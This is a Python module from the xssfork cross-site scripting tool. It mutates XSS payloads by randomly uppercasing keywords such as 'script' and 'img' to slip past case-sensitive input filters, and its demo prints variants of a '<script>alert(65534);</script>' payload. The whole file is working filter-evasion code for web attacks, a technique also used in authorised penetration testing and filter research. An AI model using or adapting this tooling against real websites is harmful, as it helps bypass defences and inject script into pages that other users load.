#! /usr/bin/env python
# coding=utf-8
"""
Copyright (c) 2017 xssfork developers (http://xssfork.codersec.net/)
See the file 'doc/COPYING' for copying permission
"""
from __future__ import print_function
import random

try:
    from __init__ import Temper
    from __init__ import LIGHT_MODEL
    from __init__ import HEAVY_MODEL
except ImportError:
    from temper import Temper
    from common.system_config import LIGHT_MODEL
    from common.system_config import HEAVY_MODEL


class Temper(Temper):

    def __init__(self):
        super(Temper, self).__init__()
        self.keywords = super(Temper, self).get_keywords()
        self.payload = None

    def temper(self, payload_set, model=LIGHT_MODEL, **kw):
        """
        将关键字随机大写
        eg: script->ScripT;
            img->IMg
        """
        temp_payload_set = payload_set
        if not isinstance(payload_set, set):
            payload_set = set()
            payload_set.add(temp_payload_set)
        payloads = set()
        number = 2
        for eachkw in kw:
            if eachkw == "number":
                number = kw[eachkw]

        for payload in payload_set:
            self.payload = payload
            temp_payload = payload
            payloads.add(payload)
            for keyword in self.keywords:
                if keyword in payload:
                    payloads.add(temp_payload.replace(keyword, self.rand_upper(keyword, number)))
                    payload = payload.replace(keyword, self.rand_upper(keyword, number))
                    payloads.add(payload)
        if model == LIGHT_MODEL:
            return payloads.pop()
        return payloads

    def rand_upper(self, str, number):
        i = 0
        str = list(str)
        while i < number and i < len(str):
            random_index = int(random.random()*len(str))
            if str[random_index].islower():
                str[random_index] = str[random_index].upper()
                i += 1
        return "".join(str)


if __name__ == "__main__":
    payloads = set()
    payload = '<script>alert(65534);</script>'
    for tenp in Temper().temper(payload, HEAVY_MODEL):
        print (tenp)